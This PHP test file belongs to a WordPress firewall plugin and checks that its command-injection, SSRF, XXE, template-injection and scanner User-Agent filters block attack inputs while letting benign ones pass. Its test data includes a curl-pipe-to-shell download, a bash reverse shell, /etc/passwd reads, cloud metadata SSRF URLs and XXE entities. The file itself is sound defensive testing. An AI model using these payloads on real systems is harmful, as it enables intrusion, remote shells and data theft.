<?php
/**
 * Command-injection, SSRF, XXE and template-injection shields, and the scanner User-Agent filter.
 * Included by run.php, shares its ok() helper and $pass/$fail counters.
 *
 * @package     Colorpack Shield (WordPress)
 * @copyright   Copyright (C) 2026 COLORPACK CREATION CO., LTD. All rights reserved.
 * @license     GNU General Public License version 3 or later
 */

use Colorpack\WP\ColorpackShield\Waf\RequestData;
use Colorpack\WP\ColorpackShield\Waf\Shield\CmdiShield;
use Colorpack\WP\ColorpackShield\Waf\Shield\SsrfShield;
use Colorpack\WP\ColorpackShield\Waf\Shield\SstiShield;
use Colorpack\WP\ColorpackShield\Waf\Shield\UserAgentShield;
use Colorpack\WP\ColorpackShield\Waf\Shield\XxeShield;
use Colorpack\WP\ColorpackShield\Waf\WafEngine;
use Colorpack\WP\ColorpackShield\Waf\WafResult;

/** @param array<string,mixed> $post */
$injPost = static fn (array $post): RequestData => new RequestData(['POST' => $post]);

// --- command injection ------------------------------------------------------

$cmdi = new CmdiShield();

foreach ([
    'chained ls with option'  => 'file.txt; ls -la',
    'pipe to whoami'          => 'x | whoami',
    'and-chain cat of a path' => 'a && cat /etc/passwd',
    'command substitution'    => 'name=$(whoami)',
    'backticks'               => 'x`id`',
    'shell path'              => '/bin/bash -c foo',
    'download and run'        => 'curl http://e.example/x.sh | sh',
    'reverse shell'           => 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
    'IFS evasion'             => 'cat${IFS}/etc/hosts',
    'encoded separator'       => 'x%3B%20ls%20-la',
] as $label => $payload) {
    ok("cmdi: blocks $label", $cmdi->inspect($injPost(['q' => $payload]))->matched);
}

foreach ([
    'prose with a semicolon and the word cat' => 'I love dogs; cat food is another matter',
    'the word id in a sentence'               => 'Please send your id and name',
    'jQuery code in a post'                   => '$(document).ready(function () { init(); });',
    'plain url'                               => 'https://example.com/page?id=5',
    'a path with a semicolon'                 => 'colors: red; blue; green',
] as $label => $payload) {
    ok("cmdi: leaves $label alone", !$cmdi->inspect($injPost(['q' => $payload]))->matched);
}

// --- SSRF ---------------------------------------------------------------------

$ssrf = new SsrfShield();

foreach ([
    'localhost url'       => 'http://localhost/admin',
    'loopback address'    => 'http://127.0.0.1:8080/',
    'private network'     => 'https://192.168.1.10/status',
    '172 private range'   => 'http://172.20.0.5/',
    'cloud metadata'      => 'http://169.254.169.254/latest/meta-data/',
    'gcp metadata name'   => 'http://metadata.google.internal/computeMetadata/v1/',
    'gopher scheme'       => 'gopher://127.0.0.1:6379/_PING',
    'dict scheme'         => 'dict://localhost:11211/stats',
    'file scheme'         => 'file:///etc/passwd',
    'userinfo trick'      => 'http://evil@127.0.0.1/',
] as $label => $payload) {
    ok("ssrf: blocks $label", $ssrf->inspect($injPost(['url' => $payload]))->matched);
}

foreach ([
    'a public url'                  => 'https://example.com/image.png',
    'a public address on 172.32'    => 'http://172.32.0.1/',
    'text that mentions localhost'  => 'run it on http://localhost while testing',
    'a plain word'                  => 'localhost',
] as $label => $payload) {
    ok("ssrf: leaves $label alone", !$ssrf->inspect($injPost(['url' => $payload]))->matched);
}

// --- XXE ------------------------------------------------------------------------

$xxe = new XxeShield();

foreach ([
    'external entity'  => '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
    'public entity'    => '<!DOCTYPE r [<!ENTITY x PUBLIC "-//a" "http://e.example/x">]>',
    'parameter entity' => '<!DOCTYPE r [<!ENTITY % p SYSTEM "http://e.example/e.dtd"> %p;]>',
    'xinclude'         => '<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="/etc/passwd"/></r>',
] as $label => $payload) {
    ok("xxe: blocks $label", $xxe->inspect($injPost(['xml' => $payload]))->matched);
}

ok('xxe: leaves ordinary xml alone', !$xxe->inspect($injPost(['xml' => '<?xml version="1.0"?><rss><channel><title>News</title></channel></rss>']))->matched);
ok('xxe: leaves a doctype without entities alone', !$xxe->inspect($injPost(['xml' => '<!DOCTYPE html><html><body>hi</body></html>']))->matched);

// --- template injection --------------------------------------------------------------

$ssti = new SstiShield();

foreach ([
    'twig math probe'   => '{{7*7}}',
    'spaced probe'      => '{{ 7 * 7 }}',
    'el math probe'     => '${7*7}',
    'erb math probe'    => '<%= 7*7 %>',
    'jinja object walk' => "{{ ''.__class__.__mro__[1].__subclasses__() }}",
    'spring el'         => '${T(java.lang.Runtime).getRuntime()}',
] as $label => $payload) {
    ok("ssti: blocks $label", $ssti->inspect($injPost(['name' => $payload]))->matched);
}

ok('ssti: leaves a price like "{ 7 }" alone', !$ssti->inspect($injPost(['name' => 'Total { 7 } items']))->matched);
ok('ssti: leaves a plain mustache variable alone', !$ssti->inspect($injPost(['name' => 'Hello {{name}}']))->matched);

// --- mode: log mode records, block mode refuses ------------------------------------------

$logEngine = new WafEngine([new CmdiShield(WafResult::MODE_LOG)], ['cmdi' => ['site']]);
$found     = $logEngine->inspectAll('site', $injPost(['q' => 'x; ls -la']));
ok('cmdi: log mode does not block', $found['block'] === null);
ok('cmdi: log mode still records the hit', count($found['logged']) === 1 && $found['logged'][0]->rule === 'chained_command');

$blockEngine = new WafEngine([new CmdiShield(WafResult::MODE_BLOCK)], ['cmdi' => ['site']]);
ok('cmdi: block mode refuses', $blockEngine->inspect('site', $injPost(['q' => 'x; ls -la']))->matched);
ok('cmdi: default mode is block', (new CmdiShield())->inspect($injPost(['q' => 'x; ls -la']))->mode === WafResult::MODE_BLOCK);

// --- scanner User-Agent ------------------------------------------------------------------

$ua = static fn (string $value): RequestData => new RequestData(['UA' => ['user-agent' => $value]]);
$uaShield = new UserAgentShield();

foreach ([
    'sqlmap/1.7.2#stable (https://sqlmap.org)',
    'Mozilla/5.0 (compatible; Nikto/2.5.0)',
    'Nuclei - Open-source project (github.com/projectdiscovery/nuclei)',
    'WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)',
    'rmut-cert-toolkit',
] as $agent) {
    ok("ua: refuses $agent", $uaShield->inspect($ua($agent))->matched);
}

foreach ([
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36',
    'curl/8.4.0',
    'python-requests/2.31.0',
    'Googlebot/2.1 (+http://www.google.com/bot.html)',
    '',
] as $agent) {
    ok('ua: leaves alone "' . substr($agent, 0, 30) . '"', !$uaShield->inspect($ua($agent))->matched);
}

ok('ua: ignores the same text in another source', !$uaShield->inspect(new RequestData(['GET' => ['q' => 'sqlmap']]))->matched);
ok('ua: extra words are matched', (new UserAgentShield(WafResult::MODE_BLOCK, ['badbot']))->inspect($ua('Mozilla BadBot/1.0'))->rule === 'custom_user_agent');
ok('ua: log mode reports the mode', (new UserAgentShield(WafResult::MODE_LOG))->inspect($ua('sqlmap/1.0'))->mode === WafResult::MODE_LOG);
